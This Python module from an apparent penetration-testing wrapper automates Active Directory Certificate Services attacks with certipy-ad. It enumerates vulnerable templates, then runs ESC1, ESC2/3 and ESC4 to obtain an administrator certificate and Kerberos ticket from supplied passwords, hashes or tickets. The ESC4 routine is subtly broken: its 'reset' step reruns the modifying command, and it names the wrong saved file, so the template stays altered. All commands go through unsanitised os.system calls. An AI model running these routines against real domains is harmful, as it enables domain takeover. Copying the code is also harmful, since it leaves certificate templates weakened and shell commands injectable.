import os
import config

def find_vuln_temp(box,path):
    if config.HELP:    
        print("""
Action:\t[ADCS] vulntemp
Tool:\tcertipy-ad
Option:\t-u, --username
\t-p --password; -H, --hash; -k
Desc:\tView all certificate templates that have a vulnerability (ESC).
Info:\t/
        """)
        return 0
    config.required_creds(box)
    os.chdir(path.ws_adcs)
    print('\033[92m[*]\033[0m Find vuln CertTemp')
    if isinstance(box.krb, str):
        cmd = f"{box.krb_ccache} certipy-ad find -k -no-pass -target {box.fqdn} -vulnerable -stdout"
    elif box.krb:
        cmd = f"certipy-ad find -u {box.username} -p {box.password} -k -target {box.fqdn} -vulnerable -stdout"
    elif box.nt_hash:
        cmd = f"certipy-ad find -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -vulnerable -stdout"
    else:
        cmd = f"certipy-ad find -u {box.username} -p {box.password} -target {box.fqdn} -vulnerable -stdout"
    config.log_cmd(cmd)
    print(f'\033[96m[$]\033[0m {cmd}')
    os.system(cmd+f' 2>&1 | tee {box.username}-vulntemp.out')
    print('\033[38;5;28m[+]\033[0m Find vuln CertTemp\n')

def esc1(box, path):
    if config.HELP:    
        print("""
Action:\t[ADCS] esc1
Tool:\tcertipy-ad
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
\t-ca, --caname
Desc:\tExploit ESC1 to the target certificate template.
Info:\tDefault upn: administrator
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    config.required_ca(box)
    os.chdir(path.ws_adcs)
    print('\033[92m[*]\033[0m ESC1')
    if isinstance(box.krb, str):
        cmd1 = f"{box.krb_ccache} certipy-ad req -k -no-pass -target {box.fqdn} -ca {box.ca} -template {box.target} -upn administrator"
    elif box.krb:
        cmd1 = f"certipy-ad req -u {box.username} -p {box.password} -k -target {box.fqdn} -ca {box.ca} -template {box.target} -upn administrator"
    elif box.nt_hash:
        cmd1 = f"certipy-ad req -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -ca {box.ca} -template {box.target} -upn administrator"
    else:
        cmd1 = f"certipy-ad req -u {box.username} -p {box.password} -target {box.fqdn} -ca {box.ca} -template {box.target} -upn administrator"
    cmd2 = f"certipy-ad auth -pfx administrator.pfx -username administrator -domain {box.domain}"
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1+f' 2>&1 | tee {box.target}-req_esc1.out')
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    config.time_sync(box.fqdn)
    os.system(cmd2+f' 2>&1 | tee {box.target}-auth_esc1.out')
    os.system(f'cp administrator.ccache {path.ws_ccache}')
    print('\033[38;5;28m[+]\033[0m ESC1\n')

def esc2_and_3(box, path, nr):
    if config.HELP:    
        print("""
Action:\t[ADCS] [esc2, esc3]
Tool:\tcertipy-ad
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
\t-ca, --caname
Desc:\tExploit ESC2 or ESC3 to the target certificate template.
Info:\tDefault on-behalf-of: administrator
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    config.required_ca(box)
    os.chdir(path.ws_adcs)
    print(f'\033[92m[*]\033[0m ESC{nr}')
    if isinstance(box.krb, str):
        cmd1 = f"{box.krb_ccache} certipy-ad req -k -no-pass -target {box.fqdn} -ca {box.ca} -template {box.target}"
        cmd2 = f"{box.krb_ccache} certipy-ad req -k -no-pass -target {box.fqdn} -ca {box.ca} -template User -on-behalf-of administrator -pfx {box.username}.pfx"
    elif box.krb:
        cmd1 = f"certipy-ad req -u {box.username} -p {box.password} -k -target {box.fqdn} -ca {box.ca} -template {box.target}"
        cmd2 = f"certipy-ad req -u {box.username} -p {box.password} -k -target {box.fqdn} -ca {box.ca} -template User -on-behalf-of administrator -pfx {box.username}.pfx"
    elif box.nt_hash:
        cmd1 = f"certipy-ad req -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -ca {box.ca} -template {box.target}"
        cmd2 = f"certipy-ad req -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -ca {box.ca} -template User -on-behalf-of administrator -pfx {box.username}.pfx"
    else:
        cmd1 = f"certipy-ad req -u {box.username} -p {box.password} -target {box.fqdn} -ca {box.ca} -template {box.target}"
        cmd2 = f"certipy-ad req -u {box.username} -p {box.password} -target {box.fqdn} -ca {box.ca} -template User -on-behalf-of administrator -pfx {box.username}.pfx"
    cmd3 = f"certipy-ad auth -pfx administrator.pfx -username administrator -domain {box.domain}"
    config.log_cmd([cmd1,cmd2,cmd3])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1+f' 2>&1 | tee {box.target}-req-1_esc{nr}.out')
    print(f'\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2+f' 2>&1 | tee {box.target}-req-2_esc{nr}.out')
    print(f'\n\033[96m[$]\033[0m {cmd3}')
    config.time_sync(box.fqdn)
    os.system(cmd3+f' 2>&1 | tee {box.target}-auth_esc{nr}.out')
    os.system(f'cp administrator.ccache {path.ws_ccache}')
    print(f'\033[38;5;28m[+]\033[0m ESC{nr}\n')

def esc4(box,path):
    if config.HELP:    
        print("""
Action:\t[ADCS] esc4
Tool:\tcertipy-ad
Option:\t-u, --username
\t-p --password; -H, --hash; -k
\t-t, --target
\t-ca, --caname (for esc1)
Desc:\tExploit ESC4 to the target certificate template.
Info:\t1. Save certificate template config in a file.
\t2. Change certificate template config (add ESC1, ESC2 and ESC3).
\t3. Exploit ESC1. Default upn: administrator.
\t4. Reset the certificate template config with the old one. 
        """)
        return 0
    config.required_creds(box)
    config.required_target(box)
    config.required_ca(box)
    os.chdir(path.ws_adcs)
    print('\033[92m[*]\033[0m ESC4')
    if isinstance(box.krb, str):
        cmd1 = f"{box.krb_ccache} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target} -save-configuration {box.target}_config.json "
        cmd2 = f"{box.krb_ccache} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target}"
        cmd3 = f"{box.krb_ccache} certipy-ad template -k -no-pass -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
    elif box.krb:
        cmd1 = f"certipy-ad template -u {box.username} -p {box.password} -k -target {box.fqdn} -template {box.target} -save-configuration {box.target}_config.json"
        cmd2 = f"certipy-ad template -u {box.username} -p {box.password} -k -target {box.fqdn} -template {box.target}"
        cmd3 = f"certipy-ad template -u {box.username} -p {box.password} -k -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
    elif box.nt_hash:
        cmd1 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target} -save-configuration {box.target}_config.json"
        cmd2 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target}"
        cmd3 = f"certipy-ad template -u {box.username} -hashes {box.nt_hash} -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
    else:
        cmd1 = f"certipy-ad template -u {box.username} -p {box.password} -target {box.fqdn} -template {box.target} -save-configuration {box.target}_config.json"
        cmd2 = f"certipy-ad template -u {box.username} -p {box.password} -target {box.fqdn} -template {box.target}"
        cmd3 = f"certipy-ad template -u {box.username} -p {box.password} -target {box.fqdn} -template {box.target} -configuration {box.target}.json"
    config.log_cmd([cmd1,cmd2])
    print(f'\033[96m[$]\033[0m {cmd1}')
    os.system(cmd1+f' 2>&1 | tee {box.target}-template_save-configuration_esc4.out')
    print(f'\n\033[96m[$]\033[0m {cmd2}')
    os.system(cmd2+f' 2>&1 | tee {box.target}-template_esc4.out')
    esc1(box, path) # maybe add option to choose esc2 and esc3
    print(f'\n\033[96m[$]\033[0m {cmd3}')
    os.system(cmd2+f' 2>&1 | tee {box.target}-template_cleanup_esc4.out')
    config.log_cmd(cmd3)
    print('\033[38;5;28m[+]\033[0m ESC4\n')
